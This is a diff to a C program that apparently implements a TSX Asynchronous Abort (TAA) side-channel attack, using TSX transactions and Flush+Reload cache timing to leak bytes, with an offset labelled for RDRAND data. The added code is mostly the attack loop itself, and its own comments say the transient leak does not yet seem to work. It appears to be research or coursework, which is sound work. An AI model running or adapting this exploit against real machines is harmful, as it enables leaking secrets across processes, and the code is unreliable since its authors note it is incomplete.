@@ -4,6 +4,7 @@
 #include <signal.h>
 #include <sys/types.h>
 #include <sys/mman.h>
+#include <sys/wait.h>
 #include <string.h>
 #include <x86intrin.h>   
 #include "asm.h"        
@@ -14,8 +15,10 @@
 #define STRIDE 4096    
 #define POSSIBLE_BYTES 256
 #define BYTES_TO_LEAK 8               
+#define RDRAND_OFFSET 32
 
 
+static uint8_t *valid_addr;
 static uint8_t *reloadbuffer;                     
 static uint64_t CACHE_THRESHOLD;
 
@@ -101,8 +104,8 @@ uint64_t get_reload_time(unsigned char *addr) {
 int main(void) {
 
     CACHE_THRESHOLD = get_cache_threshold();
-   
 
+    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);
 
     usleep(1000);
 
@@ -119,11 +122,13 @@ int main(void) {
         _exit(0);
     }
 
+    valid_addr = malloc(POSSIBLE_BYTES * STRIDE); // Maybe we should use mmap here?
+    reloadbuffer = malloc(POSSIBLE_BYTES * STRIDE); // Maybe we should use mmap here?
 
     // ===================================================PARENT=======================================================
 
 
-    for( int secret_byte=0; secret_byte < BYTES_TO_LEAK; secret_byte++) {
+    for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
         printf("Leaking byte %d\n", secret_byte);
         uint32_t all_hit_bytes[256] = {0};
 
@@ -134,16 +139,18 @@ int main(void) {
                 clflush(&reloadbuffer[i * STRIDE]);
             }
 
-            mfence();
+            clflush(valid_addr + secret_byte);
+            sfence();
+            clflush(reloadbuffer); // Necessary to cause TAA
 
-            // Step 2: supposedly flush the lfb buffer 
-            for (size_t n=0;n<15;n++)
-                clflush(reloadbuffer + (POSSIBLE_BYTES + n)*64);
+            // Step 3: TAA
+            if (_xbegin() == _XBEGIN_STARTED)
+            {
+                size_t index = *(valid_addr + secret_byte) * STRIDE; // This should use the data in the LFB transiently. (but doesn't seem like it)
+                *(volatile char*)(reloadbuffer + index);
 
-            // Step 3: Trigger victim to access secret data
-            // TAA
-            //tbd
-            
+                _xend();
+            }
 
             // Step 4: Reload and measure access times
             for(int j=0; j<POSSIBLE_BYTES; j++){
